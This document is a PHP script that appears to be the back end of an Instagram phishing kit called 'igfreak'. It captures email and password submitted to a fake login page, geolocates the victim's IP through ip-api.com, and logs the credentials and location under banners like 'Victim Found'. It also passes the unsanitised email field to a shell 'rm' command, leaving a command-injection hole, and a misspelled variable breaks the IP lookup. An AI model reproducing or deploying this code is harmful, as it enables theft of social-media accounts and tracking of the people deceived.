<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$browser = $_SERVER['HTTP_USER_AGENT'];
$FCL="\033[01;33m";
$MCL="";
$NCL="\033[00m";
$email = $_POST['email'];
$pass = $_POST['pass'];
$data = @unserialize(file_get_contents('http://ip-api.com/php/'.$ipadress));
$FCL="\e[33m";
$MCL="\e[36m";
$NCL="\033[00m";
date_default_timezone_set($data['timezone']);
$CY="\e[35m";
$MA="\e[36m";
$BL="\e[34m";
$YE="\e[33m";
$GR="\e[32m";
$RD="\e[31m";
$Wh="\e[37m";
$Re="\e[0m";
$file = 'ip.txt';
$fp = fopen($file, 'a');
fwrite($fp, "\n".$BL."[".$YE.">".$BL."] ".$GR."Victim Found\n");
fwrite($fp,  "\n ".$FCL."IP Address    ".$MCL."  : ".$data['query']);
fwrite($fp,  "\n ".$FCL."Country Code  ".$MCL."  : ".$data['countryCode']);
fwrite($fp,  "\n ".$FCL."Country       ".$MCL."  : ".$data['country']);
fwrite($fp,  "\n ".$FCL."Region        ".$MCL."  : ".$data['region']);
fwrite($fp,  "\n ".$FCL."Region Name   ".$MCL."  : ".$data['regionName']);
fwrite($fp,  "\n ".$FCL."City.         ".$MCL."  : ".$data['city']);
fwrite($fp,  "\n ".$FCL."Zip Code      ".$MCL."  : ".$data['zip']);
fwrite($fp,  "\n ".$FCL."Time Zone     ".$MCL."  : ".$data['timezone']);
fwrite($fp,  "\n ".$FCL."Service       ".$MCL."  : ".$data['isp']);
fwrite($fp,  "\n ".$FCL."Organisation  ".$MCL."  : ".$data['org']);
fwrite($fp,  "\n ".$FCL."ASN           ".$MCL."  : ".$data['as']);
fwrite($fp,  "\n ".$FCL."Latitude      ".$MCL."  : ".$data['lat']);
fwrite($fp,  "\n ".$FCL."User Agent    ".$MCL."  : ".$browser);
fwrite($fp,  "\n ".$FCL."Ig Mail       ".$MCL."  : ".$email);
fwrite($fp,  "\n ".$FCL."IP Pass       ".$MCL."  : ".$pass);
fwrite($fp, " \n\n".$BL."[".$YE.">".$BL."] ".$GR."Saved as :".$CY."igfreak_dumps/".$email.".igfreak\n");
fwrite($fp, "".$BL."[".$YE.">".$BL."] ".$Wh."Waiting For More victims...\n\n");

$cur_dir = getcwd(); 
fclose($fp);
$file2 = $cur_dir."/../igfreak_dumps/".$email.".igfreak";
shell_exec("rm ".$file2." > /dev/null 2&>1");
$fp = fopen($file2, 'a');
fwrite($fp, "Ig Username :  ".$email);
fwrite($fp, "\nIg Password :  ".$pass);
fclose($fp);